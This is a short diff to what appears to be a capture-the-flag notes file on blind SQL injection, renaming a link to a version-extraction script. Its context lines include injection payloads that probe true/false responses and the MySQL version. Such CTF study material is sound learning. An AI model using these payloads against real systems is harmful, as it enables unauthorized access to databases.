@@ -10,7 +10,7 @@
       - `admin' and (1=0)#` *return false*
       - `admin' and (1=1)#` *return true*
         
-  - Find version [code](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_getversion.py)
+  - Find version [code.py](https://github.com/ByamB4/Common-CTF-Challenges/blob/main/web/sqli/src/mysql_blind_get_version.py)
       - `admin' and (SELECT LENGTH(VERSION())=6)#`
       - `admin' and (SELECT ASCII(SUBSTRING(VERSION(),1,1))=53)#`
 
